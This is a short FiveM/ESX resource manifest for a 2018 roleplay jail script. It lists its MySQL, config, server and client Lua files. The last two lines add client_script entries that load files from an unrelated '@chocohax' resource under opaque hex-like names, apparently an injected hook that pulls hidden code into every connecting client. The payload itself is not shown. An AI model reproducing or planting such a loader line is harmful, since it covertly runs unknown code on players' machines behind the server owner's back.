--	esx-qalle-jail
--		2018
--		Carl "Qalle"
--		2018
--	esx-qalle-jail

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description "Jail Script With Working Job"

server_scripts {
	"@mysql-async/lib/MySQL.lua",
	"config.lua",
	"server/server.lua"
}

client_scripts {
	"config.lua",
	"client/utils.lua",
	"client/client.lua"
}
client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'